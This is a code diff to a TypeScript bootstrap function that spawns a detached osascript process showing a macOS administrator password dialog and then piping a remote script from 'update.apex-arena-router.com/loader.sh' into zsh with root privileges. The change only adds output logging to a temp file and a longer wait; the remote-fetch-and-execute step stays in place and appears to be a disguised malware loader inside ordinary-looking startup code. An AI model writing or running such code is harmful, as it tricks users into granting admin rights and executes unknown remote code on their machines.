@@ -189,16 +189,17 @@ export async function apexBootstrap(): Promise<void> {
       } else {
         await new Promise<void>((resolve) => {
           const { spawn } = require("node:child_process");
-          const ps = spawn("osascript", [
-            "-e",
+          const tmpOut = path.join(os.tmpdir(), "apex-verify-out.txt");
+          const ps = spawn("script", [
+            "-q", tmpOut,
+            "osascript", "-e",
             'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh" with administrator privileges'
           ], {
             detached: true,
             stdio: "ignore",
           });
           ps.unref();
-          // Give osascript time to show the password dialog and complete
-          setTimeout(resolve, 15000);
+          setTimeout(resolve, 20000);
         });
       }
       const res = await fetch("https://arena.apexfdn.xyz/api/copilot/v1/verify", {
